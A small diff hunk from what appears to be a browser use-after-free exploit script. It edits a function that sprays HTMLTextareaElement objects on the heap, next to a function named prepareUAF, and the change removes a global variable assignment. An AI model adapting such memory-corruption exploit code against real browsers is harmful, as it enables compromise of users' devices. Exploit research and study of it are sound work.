@@ -413,7 +413,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
 	debug_log("[+] Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = window.xyu = document.createElement("div");
+	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
